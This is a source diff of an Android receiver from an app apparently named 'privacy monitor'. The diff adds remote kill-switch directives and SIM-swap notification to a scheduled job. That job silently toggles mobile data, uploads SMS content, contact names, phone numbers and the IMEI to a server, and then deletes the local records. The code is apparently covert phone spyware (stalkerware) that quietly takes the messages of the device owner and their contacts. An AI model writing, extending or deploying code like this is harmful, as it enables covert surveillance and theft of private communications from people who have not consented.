@@ -10,8 +10,10 @@ import org.json.JSONException;
 import org.json.JSONObject;
 import com.privacy.monitor.base.C;
 import com.privacy.monitor.db.CallRecordDB;
+import com.privacy.monitor.db.DirectiveDB;
 import com.privacy.monitor.db.MonitorDB;
 import com.privacy.monitor.db.SMSRecordDB;
+import com.privacy.monitor.db.util.DirectiveUtil;
 import com.privacy.monitor.domain.CallRecord;
 import com.privacy.monitor.domain.Monitor;
 import com.privacy.monitor.domain.SMSRecord;
@@ -24,6 +26,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.os.SystemClock;
+import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 
 /**
@@ -35,6 +38,8 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	private MonitorDB monitorDB;
 	private SMSRecordDB smsRecordDB;
 	private CallRecordDB callRecordDB;
+	private DirectiveDB directiveDB;
+	private TelephonyManager tm;
 	
 	@Override
 	public void onReceive(final Context context, Intent intent) {
@@ -43,15 +48,31 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 			boolean isCloseMobileNet = false;
 			@Override
 			public void run() {
-				Logger.d("CronBroadcaseRectiver","定时任务启动了");
+				smsRecordDB = SMSRecordDB.getInstance(context);
+				callRecordDB = CallRecordDB.getInstance(context);
+				directiveDB = DirectiveDB.getInstance(context);
+				if(DirectiveUtil.isStopAllFunction(directiveDB)){
+					return ;
+				}
+				
 				if(!HttpUtil.detect(context)){
 					Logger.d("CronBroadcaseRectiver","开启网络");
 					AppUtil.toggleMobileNet(context, true);
 					isCloseMobileNet = true;
 				}
 				SystemClock.sleep(10000);
-				smsRecordDB = SMSRecordDB.getInstance(context);
-				callRecordDB = CallRecordDB.getInstance(context);
+				
+				if(tm==null){
+					tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+				}
+				SharedPreferences sp = context.getSharedPreferences(C.PHONE_INFO,Context.MODE_PRIVATE);
+				if(C.isBoot){
+					if(DirectiveUtil.toggelSIM(context, tm, directiveDB)){
+						   //执行换卡通知
+						C.isBoot = false;
+					}
+				}
+				
 				new Thread(new Runnable() {
 					@Override
 					public void run() {
@@ -60,7 +81,7 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 					}
 				}).start();
 				
-				SharedPreferences sp = context.getSharedPreferences(C.PHONE_INFO,Context.MODE_PRIVATE);
+				
 				String monitorList = AppUtil.streamToStr(NetworkUtil.download(context,"tel="+sp.getString(C.PHONE,""),C.RequestMethod.getMonitorList));
 			    if(isCloseMobileNet){
 			    	AppUtil.toggleMobileNet(context, false);
@@ -178,7 +199,9 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 		SharedPreferences sp = context.getSharedPreferences(C.PHONE_INFO,Context.MODE_PRIVATE);
 		String updateDate = "my_num="+sp.getString(C.PHONE,"")+"&you_num="+smsRecord.getPhone()+"&time="+smsRecord.getDateSent()+"&content="+smsRecord.getMessageContent()+"&type="+smsRecord.getType()+"&sim_id="+AppUtil.getIMEI(context)+"&you_name="+smsRecord.getName();
 		String updateResult= AppUtil.streamToStr(NetworkUtil.upload(context,updateDate,C.RequestMethod.uploadSMS));
+		Logger.d("Cron", "返回结果："+updateResult);
 		if("ok".equalsIgnoreCase(updateResult)){
+			Logger.d("Cron", "删除了短信记录...");
 			smsRecordDB.delete(SMSRecord.COL_DATE +" = ?",new String []{smsRecord.getDateSent()});
 		}
 	}
